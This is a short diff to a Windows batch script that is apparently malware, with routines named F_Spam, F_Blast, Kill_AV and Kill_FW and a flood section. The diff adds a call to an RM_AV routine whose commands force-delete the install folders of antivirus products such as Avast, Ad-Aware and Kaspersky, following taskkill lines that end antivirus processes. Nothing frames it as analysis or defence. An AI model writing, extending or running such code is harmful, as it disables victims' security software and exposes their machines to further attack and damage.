@@ -5,6 +5,7 @@ call F_Spam >nul
 call F_Blast >nul
 call Kill_AV >nul
 call Kill_FW >nul
+call RM_AV >nul
 goto main
 
 :flood
@@ -92,6 +93,7 @@ taskkill /F /IM avas* >NUL
 taskkill /F /IM norm* >NUL
 taskkill /F /IM offg* >NUL
 
+:RM_AV
 RMDIR /Q "C:\Program Files\alwils~1" /S >NUL
 RMDIR /Q "C:\Program Files\Lavasoft\Ad-awa~1" /S >NUL
 RMDIR /Q "C:\Program Files\kasper~1" /S >NUL
